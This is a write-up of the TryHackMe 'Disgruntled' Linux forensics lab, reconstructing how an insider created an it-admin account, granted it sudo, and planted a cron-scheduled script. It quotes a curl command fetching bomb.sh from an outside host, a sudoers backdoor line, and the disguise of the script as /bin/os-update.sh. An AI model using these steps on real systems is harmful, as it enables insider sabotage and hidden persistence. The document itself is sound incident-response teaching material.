# TryHackMe — Disgruntled Writeup

## Room Overview

**Disgruntled** is a Linux forensics room focused on investigating suspicious activity on a compromised system.
The scenario involves a potentially unhappy employee who may have abused their privileges to plant a malicious script.

The goal of the investigation is to reconstruct what happened by analyzing Linux forensic artifacts such as:

- authentication logs,
- sudo activity,
- shell history,
- Vim history,
- file metadata,
- and scheduled cron jobs.

This room is useful for practicing basic Linux incident response and understanding how attacker activity can be traced through system logs.

---

## Investigation Methodology

The investigation followed a simple forensic approach:

```text
1. Review authentication and sudo logs.
2. Identify privileged commands.
3. Look for newly created users.
4. Check for modifications to sudo privileges.
5. Inspect shell history for suspicious commands.
6. Analyze editor history for renamed or moved files.
7. Review cron jobs for persistence or scheduled execution.
```

The main log file used during the first part of the investigation was:

```bash
/var/log/auth.log.1
```

This file is important because it records login activity, sudo usage, authentication events, and other privilege-related actions.

---

## Task 3 — Nothing Suspicious… So Far

### Finding the Installed Package

The first step was to inspect commands executed with elevated privileges.

Since the question asked about a package installation, I narrowed the output by searching for installation-related commands:

```bash
 sudo cat /var/log/auth.log.1 | grep install
```

This revealed that the user ran the following command:

```bash
/usr/bin/apt install dokuwiki
```

The log entry also showed the directory where the command was executed from.

The `PWD` field in the log showed:

```bash
/home/cybert
```

### Answers

```text
Full command: /usr/bin/apt install dokuwiki
PWD: /home/cybert
```

---

## Task 4 — Let’s See If You Did Anything Bad

After identifying the package installation, I continued reviewing the authentication logs to check whether the same user performed more suspicious actions.

### Finding a Newly Created User

User creation on Linux often appears in logs through commands such as `adduser` or `useradd`.

I searched for both:

```bash
 sudo cat /var/log/auth.log.1 | grep -E "adduser | useradd"
```

This showed that usually user are added by using <b>useradd</b> but here i spotted <b>1 user</b> added using <b>adduser</b> instead.

The created user was:

```text
it-admin
```

This immediately looked suspicious because the name sounds like a legitimate administrative account, which could be used to hide unauthorized access.

---

### Checking for Sudoers Modification

Next, I looked for evidence that the new user had been granted elevated privileges.

The sudoers file controls which users can run commands as root. It is normally edited with:

```bash
visudo
```

```bash
# User privilege specification
root    ALL=(ALL:ALL) ALL
cybert  ALL=(ALL:ALL) ALL
it-admin ALL=(ALL:ALL) ALL
```

So I searched the authentication logs for `visudo`:

```bash
sudo cat /var/log/auth.log.1 | grep visudo
```

The log showed that the sudoers file was modified at:

```text
Dec 28 06:27:34
```

This suggests that the attacker or malicious user may have granted sudo privileges to the newly created account.

---

### Finding a Script Opened with Vi

The next suspicious action involved a script opened using the `vi` editor.

I searched for commands involving `vi`:

```bash
 sudo cat /var/log/auth.log.1 | grep "COMMAND=.*vi"
```

The suspicious file was:

```text
bomb.sh
```

The filename strongly suggests that this script may have been used as a destructive or timed payload.

### Answers

```text
Created user: it-admin
Sudoers modification time: Dec 28 06:27:34
Script opened with vi: bomb.sh
```

---

## Task 5 — Bomb Has Been Planted. But When and Where?

At this point, the investigation had identified a suspicious user and a suspicious script.
The next goal was to determine how the script was created and where it ended up.

---

### Inspecting the Suspicious User’s Bash History

Since the suspicious user was `it-admin`, I checked that user’s shell history:

```bash
cat /home/it-admin/.bash_history
```

The Bash history revealed that the file `bomb.sh` had been downloaded from a remote server using `curl`:

```bash
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

This means the script was not manually written from scratch on the machine.
It was retrieved from an external host over HTTP on port `8080`.

### Answer

```text
curl 10.10.158.38:8080/bomb.sh --output bomb.sh
```

---

### Finding Where the Script Was Moved

The original file was named `bomb.sh`, but the challenge indicated that it had been renamed and moved somewhere else.

Because the script had been edited with `vi`, I checked Vim’s history file:

```bash
cat /home/it-admin/.viminfo
```

To make the output cleaner, I searched for `saveas`, which can show when a file was saved under a different name:

```bash
cat /home/it-admin/.viminfo | grep "saveas"
```

This revealed that the script had been saved as:

```bash
/bin/os-update.sh
```

This is suspicious because `/bin` is a system directory, and the filename `os-update.sh` sounds legitimate.
Renaming a malicious script to something like an update script is a common way to make it blend into the system.

### Answer

```text
/bin/os-update.sh
```

---

### Checking the Last Modified Time

To check when the file was last modified, I used <b>stat</b> for more detailed metadata:

```bash
stat /bin/os-update.sh
```

The file was last modified at:

```text
Dec 28 06:29
```

### Answer

```text
Dec 28 06:29
```

---

### Analyzing the Script Contents

Before running any suspicious script, it is important to inspect it safely.

I used:

```bash
cat /bin/os-update.sh
```

The script showed that it would create a file called:

```text
goodbye.txt
```

This confirms that the script behaves like a logic bomb or destructive marker script.

### Answer

```text
goodbye.txt
```

---

## Task 6 — Following the Fuse

The final step was to determine when the malicious script would execute.

On Linux systems, scheduled tasks are commonly configured using cron.

```bash
cat /etc/crontab
```

The cron entry showed that `/bin/os-update.sh` was scheduled to run at:

```text
0 8     * * *

```
```
0   8   *   *   *
│   │   │   │   │
│   │   │   │   └─ every day of the week
│   │   │   └───── every month
│   │   └───────── every day of the month
│   └───────────── at hour 8
└───────────────── at minute 0
```

### Answer

```text
08:00 AM
```

---

## Final Answers Summary

| Question                                 | Answer                                            |
| ---------------------------------------- | ------------------------------------------------- |
| Full command used to install the package | `/usr/bin/apt install dokuwiki`                   |
| Present working directory                | `/home/cybert`                                    |
| User created after package installation  | `it-admin`                                        |
| Time sudoers file was updated            | `Dec 28 06:27:34`                                 |
| Script opened with vi                    | `bomb.sh`                                         |
| Command used to create `bomb.sh`         | `curl 10.10.158.38:8080/bomb.sh --output bomb.sh` |
| New full path of the script              | `/bin/os-update.sh`                               |
| Last modified time                       | `Dec 28 06:29`                                    |
| File created by the script               | `goodbye.txt`                                     |
| Time the malicious file triggers         | `08:00 AM`                                        |

---

## Attack Timeline

```text
Initial activity
└── User cybert installs dokuwiki using sudo.

Privilege abuse
└── A new user called it-admin is created.

Privilege escalation
└── The sudoers file is modified using visudo.

Payload download
└── it-admin downloads bomb.sh using curl.

Payload hiding
└── bomb.sh is renamed and moved to /bin/os-update.sh.

Persistence / scheduled execution
└── cron is configured to execute the script at 08:00 AM.

Payload behavior
└── The script creates goodbye.txt when executed.
```

---

## Linux Forensics Artifacts Used

| Artifact           | Path                       | Purpose                                                                           |
| ------------------ | -------------------------- | --------------------------------------------------------------------------------- |
| Authentication log | `/var/log/auth.log.1`        | Tracks sudo commands, login activity, user creation, and privilege-related events |
| Bash history       | `/home/user/.bash_history` | Shows commands typed by a user                                                    |
| Vim history        | `/home/user/.viminfo`      | Reveals files opened, edited, or saved with Vim                                   |
| Cron configuration | `/etc/crontab`             | Shows scheduled system tasks                                                      |
| Cron directories   | `/etc/cron*`               | Stores additional scheduled jobs                                                  |
| File metadata      | `stat`          | Shows timestamps, ownership, and permissions                                      |

---

## Lessons Learned

This room demonstrates how much evidence can be recovered from standard Linux artifacts.
Even when a suspicious file is renamed or moved, traces may still remain in shell history, editor history, cron configuration, and authentication logs.

The most important forensic lesson is:

```text
Do not rely on only one source of evidence.
Correlate logs, command history, file metadata, and scheduled tasks.
```

In this case, the attacker’s actions were visible because they left traces in multiple places:

```text
auth.log.1    → sudo activity and user creation
.bash_history → downloaded payload
.viminfo      → renamed/moved script
/etc/crontab  → scheduled execution
/bin/         → final payload location
```

---

## Conclusion

The investigation confirmed that a suspicious user account, `it-admin`, was created and later given elevated privileges.
That user downloaded a script named `bomb.sh`, edited it, renamed it to `/bin/os-update.sh`, and scheduled it to run automatically using cron.

The malicious script was configured to trigger at:

`08:00 AM`
